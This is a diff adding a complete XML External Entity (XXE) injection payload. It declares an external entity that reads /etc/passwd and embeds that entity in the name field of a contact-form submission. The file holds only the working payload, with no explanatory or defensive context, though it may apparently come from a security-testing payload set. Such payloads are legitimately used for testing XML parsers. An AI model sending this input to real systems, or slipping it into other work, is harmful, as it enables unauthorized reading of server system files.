@@ -1,0 +1,6 @@
+<!DOCTYPE foo [
+<!ELEMENT foo ANY >
+<!ENTITY xxe SYSTEM "file:///etc/passwd" >]>
+<contact><name>
+&xxe;
+</name><email>test@gmail.com</email><message>This is my polace</message></contact>
